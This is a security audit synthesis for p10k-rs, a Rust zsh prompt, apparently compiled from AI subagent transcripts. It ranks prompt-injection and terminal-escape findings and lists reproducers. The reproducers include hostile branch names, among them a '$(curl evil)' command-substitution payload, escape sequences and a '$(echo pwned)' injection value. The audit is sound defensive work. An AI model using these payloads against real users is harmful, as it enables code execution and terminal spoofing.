# Extracted Findings — synthesis of mined transcripts (2026-05-09)

**Inputs mined:** five rate-limited subagent transcripts at `/tmp/claude-1000/.../tasks/*.output`. Methodology: read JSONL line-typed, extracted assistant text + tool inputs + tool result heads, reconstructed each agent's reasoning trail without dumping raw transcripts into context.

**Bottom line:** Of the five lanes, **only lane 2 produced a complete draft report** (preserved verbatim inside a denied Bash heredoc). Lanes 1, 3, 4 hit limits mid-investigation. Lane 5 was a duplicate IPC fanout that produced nothing.

## Master findings table

| # | Severity | Title | Location | Lane | Status | Origin |
|---|---|---|---|---|---|---|
| C1 | CRITICAL | zsh `%`-expansion of untrusted branch / cwd in PROMPT | `vcs.rs:46`, `dir.rs:29`, `core/lib.rs:161-178`, `init.zsh:147` | 2 | verified-by-agent | NEW |
| C2 | CRITICAL | ANSI/terminal escape injection (OSC, CSI, BEL, CR, BS) via branch / cwd | `gitstatusd.rs:179,192`, `vcs.rs:46`, `dir.rs:29` | 2 | verified-by-agent | NEW |
| H1 | HIGH | Instant-prompt dump file persists C1 payload across restarts | `main.rs:221-237` (`zsh_dump_line`) | 2 | verified-by-agent | NEW |
| H2 | HIGH | `install.sh` `$SHELL_NAME` not character-class validated | `install.sh:63-64` | 2 | preliminary (live exploit chain blocked by `case` statement; future-proofing only) | NEW |
| H3 | HIGH | FIFO request framing byte-injectable via directory-name `\x1F`/`\x1E` | `gitstatusd.rs:99-105` | orch | preliminary | already-in-RESUME (orchestrator) |
| H4 | HIGH | No request/response correlation; constant id allows cross-talk | `gitstatusd.rs:91-115`, parser `:165-212` | orch | preliminary | already-in-RESUME (orchestrator) |
| H5 | HIGH | Prior review's "no CRITICAL" verdict is a scope error | prior `02-security.md` § Confidence | 3 | verified-by-agent (corroborated by lane 2) | NEW (meta) |
| M1 | MEDIUM | `wrap_for_shell` does not handle `%{`/`%}` in untrusted text | `core/lib.rs:188-216` | 2 | verified-by-agent | NEW |
| M2 | MEDIUM | Non-UTF-8 branch bytes silently empty | `gitstatusd.rs:179` | 2 | verified-by-agent | already-in-RESUME (orchestrator, ranked MEDIUM there) |
| M3 | MEDIUM | "Unexploitable under 0700 parent" claim is environment-dependent | prior `02-security.md:11` | 3 | preliminary (off-default cases not walked) | NEW (meta) |
| M4 | MEDIUM | Prior review's "cargo audit unavailable" was self-imposed (cargo *is* on host) | prior `02-security.md` § "did NOT examine" | 3 | verified-by-agent | NEW (meta) |
| M5 | MEDIUM | THIRD-PARTY-LICENSES v1.5.4 pin documentary, not enforced | `THIRD-PARTY-LICENSES.md:5-7`, `install.sh:131-133` | 4 | verified-by-agent | already-in-RESUME (orchestrator) |
| M6 | MEDIUM | No release pipeline / signing / SLSA — distribution unsigned | `.github/workflows/ci.yml` (no release.yml) | 4 | verified-by-agent | NEW |
| M7 | MEDIUM | 101-package transitive surface unaudited | `Cargo.lock` | 4 | preliminary (audit blocked) | partially-in-RESUME |
| L1 | LOW | `Command::new("git").arg(...)` is safe — positive finding | `git/lib.rs:50-59` | 2 | verified-by-agent | NEW (positive) |
| L2 | LOW | `bench/fixtures/repos/` is gitignored — supply-chain concern REFUTED | `.gitignore:14-15`, `bench/fetch_fixtures.sh` | 3 + 4 | verified-by-agent (refutes orchestrator's pre-fanout suspicion) | refutes prior speculation |
| L3 | LOW | Prior review missed `p10k-rs-ai`, `p10k-rs-config`, `p10k-rs-wizard` | workspace | 3 | verified-by-agent | NEW (meta) |
| L4 | LOW | `p10k-rs-ai` does NOT call out to LLMs — pre-fanout suspicion REFUTED | `p10k-rs-ai/src/lib.rs` | 4 | verified-by-agent (refutes orchestrator's pre-fanout suspicion) | refutes prior speculation |
| I1 | INFO | Single-author repo (Sean Curran × 18 commits); no review-before-merge enforced | repo | 4 | verified-by-agent | NEW |
| I2 | INFO | CI uses `RUSTFLAGS=-D warnings` but no `cargo audit` / `cargo deny check` step | `.github/workflows/ci.yml` | 4 | verified-by-agent | NEW |
| I3 | INFO | REVIEW-SWARM methodology has no second-opinion / red-team step | `.review/REVIEW-SWARM.md` | 3 | verified-by-agent | NEW (meta) |

Legend: `orch` = the orchestrator's pre-fanout finding (in `RESUME-TOMORROW.md`), restated here for completeness. `NEW` = not in prior `.review/20260509T071500Z/`. `already-in-RESUME` = appears in the orchestrator's pre-fanout list and is independently corroborated (or contradicted) by an agent.

## Novel since prior review (`.review/20260509T071500Z/`)

The prior review's findings: TOCTOU FIFO race (MEDIUM), predictable `.tmp` (MEDIUM), umask on dump dir (MEDIUM), `locate_binary` `$PATH` trust (MEDIUM), `install.sh` `ln -sfn` (LOW), `_p10k_rs_stop_daemon` glob (LOW), `#![forbid(unsafe_code)]` (INFO+), no secrets (INFO+).

**Novel beyond that:**

1. **C1, C2** — entire data-plane (branch / cwd → PROMPT) is an unexamined CRITICAL surface. This is the headline. Two CRITICAL findings, lane 2 has them grounded with line-level evidence and a 30-second reproducer (create branch `$'%n%m'`, observe prompt expand to user@host).
2. **H1** — instant-prompt dump *persists* the C1 payload across restarts (single-quote source-time protection ≠ display-time protection). Prior review reasoned only about source-time injection.
3. **H2** — `install.sh` shell-name validation is glob-based, not character-class. Live exploit blocked by `case`, but no future-proofing.
4. **H3, H4** — orchestrator's pre-fanout finds: FIFO framing byte-injection via directory name + no request/response correlation. Both still preliminary.
5. **H5** — meta: prior review's "small security surface" claim is a category error. The most important *kind* of finding because it explains why lane 2's CRITICALs were missed.
6. **M3, M4** — meta: prior review's mitigation reasoning ("0700 parent") and exclusion ("cargo audit unavailable") are weakly supported. Re-rates the prior review's High confidence to LOW.
7. **M6** — no release pipeline / signing. Prior review treated supply chain as `deny.toml` only; ignored distribution.
8. **L3** — three crates (`-ai`, `-config`, `-wizard`) absent from prior review by name; `-config`'s future TOML loader will be a new attack surface.

**Refuted from orchestrator's pre-fanout suspicions** (i.e., things `RESUME-TOMORROW.md` flagged that the agents disproved):

- `bench/fixtures/repos/` ripgrep + linux are NOT vendored; they are gitignored and locally fetched (lanes 3 + 4).
- `p10k-rs-ai` is NOT an LLM-call surface; it does AI-host detection + OSC emission only (lane 4).

## Verification plan — cheapest reproducer per finding

| # | Reproducer | Time | Confirms / kills |
|---|---|---|---|
| C1 | `mkdir /tmp/p10ktest && cd /tmp/p10ktest && git init && git checkout -b '%n@%m'` then start a zsh with the prompt; observe whether prompt shows literal `%n@%m` or expands to `username@hostname`. | 30 s | Confirms or kills C1's info-disclosure path. If expands: CRITICAL is real. |
| C2 | `git checkout -b $'main\e]0;owned\a'` in same repo; observe terminal title bar. | 30 s | If title changes: CRITICAL real. |
| C2 | Branch `$'normal\rEVIL$ '` and re-render: observe whether prompt line shows `EVIL$ ` or `normal\rEVIL$ `. | 30 s | Carriage-return overwrite. |
| H1 | Run `c1` repro, then `exit` and start a fresh zsh; check whether `~/.cache/p10k-rs/dump-*.zsh` still contains the malicious branch. Source it manually, observe expansion. | 60 s | Confirms persistence. |
| H2 | `./install.sh --shell '$(echo pwned)'` — observe whether case-validation rejects, and whether any later code path renders the value unquoted. | 60 s | Live-exploit chain test. |
| H3 | `mkdir -p $'/tmp/test\x1F' && cd $'/tmp/test\x1F' && git init`, then trigger a prompt; tail the FIFO request to verify whether `\x1F` corrupts framing. Easier: `strace -e trace=write -p $(pgrep gitstatusd)`. | 5 min | Confirms / kills the byte-injection path. |
| H4 | Open two zsh subshells under the same `_P10K_RS_GITSTATUSD_REQ/RESP`; trigger prompts in both rapidly; check for crossed branch info. | 5 min | Confirms / kills cross-talk. |
| M2 | `git checkout -b $'\xff\xfe'` (raw bytes); observe whether prompt shows replacement char or empty. | 30 s | Confirms / kills silent-empty. |
| M4 | `cargo install --locked cargo-audit cargo-deny && cargo audit && cargo deny check`. | 5 min (first install slow) | Produces actual audit results. |
| M7 | Same as M4. | — | Same artefact. |
| M5 | `gitstatusd --version` after install; compare to `THIRD-PARTY-LICENSES.md`'s claimed v1.5.4. | 30 s | Confirms version drift if any. |

Total verification time for the top 5 (C1, C2, H1, M4, H3): about 8 minutes plus first-time `cargo install`.

## Top 3 most-likely CRITICALs (ranked)

1. **C1: zsh `%`-expansion of untrusted branch / cwd in PROMPT.**
   Strongest evidence in the audit. Greps confirmed zero `%`→`%%` escaping anywhere in the codebase, in flat contradiction with the init.zsh:15-17 comment promising slice-2 escaping. Reproducer is 30 seconds. Blast radius scales from info-disclosure (`%n%m` leaks user@host on every prompt) to RCE (with `PROMPT_SUBST` set, branch `$(curl evil)` executes every prompt — and PROMPT_SUBST is set by oh-my-zsh / prezto / p10k itself, the *target audience*). This is upstream powerlevel10k's own #1 hardening (it escapes `%`); p10k-rs has not implemented it.

2. **C2: ANSI/terminal-escape injection via branch / cwd.**
   Same evidence base. `wrap_for_shell` only recognises `\x1b[...m` SGR, ignores OSC / DCS / APC / bare control bytes. A branch `main\x1b]0;Production Server\x07` silently relabels the victim's tab. A branch with `\r` overwrites the prompt. Reproducer: 30 s. Blast radius: terminal-state spoofing, clipboard injection (OSC 52) on iTerm2 / xterm. Slightly weaker than C1 because it depends on terminal emulator behaviour, but still CRITICAL: most modern terminals execute OSC 0/2 (title) and OSC 7 (cwd) without confirmation.

3. **H3 (orchestrator's pre-fanout): FIFO request framing byte-injection via directory-name `\x1F`/`\x1E`.**
   Not yet verified, but plausible: framing is `id\x1F<dir>\x1E`, `<dir>` is `path.as_os_str().as_encoded_bytes()` verbatim. A user `cd`-ing into a path with literal RS / US bytes injects extra fields or a second request. The IPC lanes never reached this — both rate-limited or sandbox-denied. Likelihood it elevates to CRITICAL on verification: moderate. The exploit chain depends on what the daemon does with the malformed framing (silent-corrupt vs hard-error vs response-cross-talk); without that walk, it's ranked HIGH and listed here as the third most-likely-CRITICAL because the upgrade path is real.

Honourable mention: **H4** (no request/response correlation) — could become CRITICAL if combined with H3, because cross-talk + framing injection together = the next prompt rendering attacker-controlled state. Not separately CRITICAL by itself.

## What the audit cycle did NOT produce

- Any IPC findings beyond the orchestrator's pre-fanout list. Lanes 1 and 5 were both empty. The IPC angle of the audit is the largest known unknown.
- Any actual `cargo audit` / `cargo deny check` output. The host has `cargo` but not the audit tools, and the sandbox blocked the `cargo install` workaround.
- Any concrete walk of `_p10k_rs_stop_daemon`'s `rm -rf` glob under hostile input — both IPC lanes ran out before reaching it.
- Any threat-model trust-boundary table (lane 4 was about to start one when the limit hit).
- Any walk of `p10k-rs-ai`'s OSC 7 / OSC 133 emission for content-it-emits — lane 4 confirmed the *purpose* but not the *implementation* (it's mostly unimplemented per slice 10 docs anyway).

## Tomorrow's resume priorities (in order)

1. Verify C1 and C2 with the 60-second reproducers above. If they reproduce: re-rate prior review's confidence claim from "High" to "Low" with prejudice and ship a hotfix-class slice.
2. Run `cargo install --locked cargo-audit cargo-deny && cargo audit && cargo deny check`. Capture output to `.review/20260509T130000Z/cargo-audit.txt`.
3. Re-launch the IPC lane with a write-capable agent and the lane-1 prompt verbatim, in a session that does not block Bash for `grep`. The IPC lane is the largest unmeasured surface.
4. Verify H3 (FIFO framing byte-injection) and H4 (cross-talk) with the strace + two-subshell reproducers above.
5. Add `cargo audit` and `cargo deny check` steps to `.github/workflows/ci.yml`. Cheap fix per I2.
